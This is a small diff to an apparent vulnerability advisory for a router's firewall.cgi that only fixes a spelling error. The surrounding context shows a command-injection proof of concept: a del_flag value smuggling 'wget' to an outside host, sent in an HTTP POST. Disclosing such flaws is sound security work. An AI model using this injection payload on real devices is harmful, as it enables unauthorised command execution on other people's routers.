@@ -33,7 +33,7 @@ Finally,the command will be executed by  system() in sub_402AC0
 
 ## Proof of Concept (PoC)
 
-We set `del_flag` as **0;wget 192.168.6.1:6666/testpoc** , and the router will excute it,such as:
+We set `del_flag` as **0;wget 192.168.6.1:6666/testpoc** , and the router will execute it,such as:
 
 ```http
 POST /cgi-bin/firewall.cgi HTTP/1.1
@@ -52,5 +52,6 @@ firewall=singlePortForwardDelete&del_flag=0;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
 
